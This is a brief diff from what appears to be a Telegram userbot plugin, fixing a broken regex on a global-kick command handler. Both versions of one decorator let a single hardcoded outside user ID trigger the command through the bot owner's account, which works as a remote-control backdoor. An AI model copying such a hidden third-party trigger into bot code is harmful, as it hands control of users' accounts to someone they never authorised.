@@ -59,7 +59,7 @@ except BaseException:
 
 
 @register(outgoing=True, pattern=r"^\.gkick(?: |$)(.*)")
-@register(incoming=True, from_users=901878554, pattern=r"^\.cgick(?: |$(.*)")
+@register(incoming=True, from_users=901878554, pattern=r"^\.cgick$")
 async def gspide(rk):
     lazy = rk
     sender = await lazy.get_sender()
